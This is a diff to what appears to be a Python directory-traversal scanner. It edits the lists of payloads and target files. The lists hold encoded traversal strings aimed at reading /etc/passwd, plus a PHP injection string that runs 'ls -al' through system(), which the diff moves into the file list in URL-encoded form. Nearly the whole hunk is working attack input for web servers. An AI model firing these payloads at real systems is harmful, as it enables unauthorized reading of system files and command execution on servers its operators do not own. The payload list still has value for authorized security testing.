@@ -22,8 +22,8 @@ def Verif(response, url):
 	
 
 def main():
-	payloads = ["/","../../","../../../","....//....//....//","..///////..///////..///////","..%5c..%5c..%5c","..%253f..%253f..%253f","..%c0%af..%c0%af..%c0%af","%252e%252e%252f%252e%252e%252f%252e%252e%252f","/var/www/images/../../../","' and die(system("ls -al")) or '"]
-	files = ["etc/passwd","etc//passwd","etc///////passwd","etc%5cpasswd","etc%253fpasswd","etc%c0%afpasswd","etc%252fpasswd"]
+	payloads = ["/","../../","../../../","....//....//....//","..///////..///////..///////","..%5c..%5c..%5c","..%253f..%253f..%253f","..%c0%af..%c0%af..%c0%af","%252e%252e%252f%252e%252e%252f%252e%252e%252f","/var/www/images/../../../"]
+	files = ["etc/passwd","etc//passwd","etc///////passwd","etc%5cpasswd","etc%253fpasswd","etc%c0%afpasswd","etc%252fpasswd","%27%20and%20die(system(%27ls%20-al%27))%20or%20%27"]
 	nullbyte = []
 
 	if len(sys.argv) > 2:
